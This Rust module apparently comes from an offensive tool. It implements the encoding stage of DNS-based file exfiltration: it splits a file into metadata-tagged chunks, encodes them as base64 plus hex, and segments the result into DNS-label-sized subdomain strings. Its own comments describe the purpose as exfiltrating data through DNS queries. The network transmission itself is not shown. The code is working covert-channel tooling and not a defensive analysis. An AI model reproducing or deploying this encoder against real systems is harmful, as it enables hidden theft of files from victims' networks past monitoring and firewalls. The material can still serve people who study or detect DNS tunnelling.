//! DNS-based file exfiltration encoder.
//!
//! This module provides specialized encoding for DNS-based data exfiltration, handling the
//! unique constraints of DNS protocol: domain names cannot exceed 253 characters, and each
//! label (subdomain component) is limited to 63 characters.
//!
//! The DNS encoder strategically chunks data to fit within these constraints, allowing seamless
//! exfiltration across DNS queries. Each chunk is encoded with base64+hex and further segmented
//! into DNS-safe labels that can be transmitted as subdomain components.
//!
//! # DNS Constraints
//! - Maximum domain name length: 253 characters
//! - Maximum label length: 63 characters per subdomain component
//! - Maximum recommended payload: 4 MB (practical limit before single-byte queries)

use crate::nodes::{file_chunk::FileChunkNode, Node};

const DOMAIN_NAME_MAX_LENGTH: usize = 253;
const DOMAIN_LABEL_MAX_LENGTH: usize = 63;

/// Maximum practical payload size for DNS exfiltration before efficiency degrades significantly.
///
/// At 4 MB, the average DNS query encodes approximately 1 byte of actual data due to
/// base64+hex encoding overhead, making exfiltration impractical. This constant enforces
/// a sanity check to prevent accidental misuse with extremely large files.
const MAX_LIMIT_PAYLOAD_SIZE: usize = 4 * (1024 * 1024); // 4 MB

/// Builds DNS chunk nodes from the provided file bytes.
///
/// Creates a hierarchical node structure suitable for DNS exfiltration:
/// 1. Root node containing filename and unique file identifier
/// 2. Sequential file chunk nodes, each sized to fit within domain name length limits
///
/// Each chunk is carefully sized to account for:
/// - The metadata overhead (node type, root ID, chunk index)
/// - The target domain name length
/// - Base64 and hex encoding expansion
/// - DNS label length restrictions (63 chars per label)
///
/// The function validates that the domain name + encoded chunk fits within the 253-character
/// maximum domain name length. The final chunk is automatically marked as an end-of-file marker.
///
/// # Arguments
/// * `ref_root_identifier` - The root metadata node containing filename and file identifier.
/// * `domain_length` - The length of the target domain name (used for size calculations).
/// * `payload_bytes` - The complete file payload as a byte vector.
///
/// # Returns
/// A vector of `Node` objects starting with a root node followed by file chunk nodes.
/// All nodes are ready for encoding and DNS transmission
///
/// # Errors
/// - If the domain name is too long to encode any payload data.
/// - If the file exceeds the 4 MB practical size limit for DNS exfiltration.
pub fn build_chunk_nodes(
    ref_root_identifier: std::rc::Rc<[u8; 4]>,
    domain_length: usize,
    payload_bytes: Vec<u8>,
) -> crate::error::Result<Vec<Node>> {
    let decoded_length =
        (super::decoded_chunk_size(DOMAIN_LABEL_MAX_LENGTH) as f32 / 2.0).floor() as usize;

    if (domain_length + decoded_length) >= DOMAIN_NAME_MAX_LENGTH {
        return Err(crate::error::RunnerError::validation_error(
            "Domain name too long to encode any payload safely.",
        ));
    }

    if payload_bytes.len() > MAX_LIMIT_PAYLOAD_SIZE {
        return Err(crate::error::RunnerError::validation_error(
            "File size exceeds maximum limit for DNS exfiltration.",
        ));
    }

    let mut nodes: Vec<Node> = vec![];
    let mut payload_iterable = payload_bytes.into_iter();
    let mut index: usize = 1;

    loop {
        let mut file_chunk_node = FileChunkNode::default()
            .set_index(index)
            .set_raw_root_node_id(std::rc::Rc::clone(&ref_root_identifier));

        let packet_metadata_length = format!(
            "{}:{}:{:X}:",
            file_chunk_node.node_type(),
            file_chunk_node.root_node_id,
            index
        )
        .len();

        let payload_bytes_portion = payload_iterable
            .by_ref()
            .take(((decoded_length - packet_metadata_length) as f32 / 2.0).floor() as usize)
            .collect::<Vec<u8>>();

        if payload_bytes_portion.is_empty() {
            break;
        }

        file_chunk_node.extend_data(payload_bytes_portion);
        nodes.push(Node::FileChunk(file_chunk_node));
        index += 1;
    }

    nodes.last_mut().map(|last_node| {
        if let Node::FileChunk(chunk_node) = last_node {
            chunk_node.set_last_chunk();
        }
    });

    Ok(nodes)
}

/// Encodes a list of nodes into DNS-safe payload strings.
/// Each node is converted to a string, base64+hex encoded, and then split into
/// DNS label-sized chunks (max 63 characters each).
///
/// # Arguments
/// * `nodes` - A vector of `Node` objects to encode.
///
/// # Returns
/// A vector of strings, each representing a DNS-safe encoded payload for a node.
///
/// # Errors
/// - Propagates any encoding errors from the base64+hex encoder.
pub fn encode_payload(nodes: Vec<Node>) -> crate::error::Result<Vec<String>> {
    let chunk_size = (DOMAIN_LABEL_MAX_LENGTH / 2) as usize;

    Ok(nodes
        .iter()
        .map(|node| {
            crate::encoders::encode_b64_hex(node.to_string())
                .as_bytes()
                .chunks(chunk_size)
                .filter_map(|byte| std::str::from_utf8(byte).ok())
                .collect::<Vec<&str>>()
                .join(".")
        })
        .collect())
}
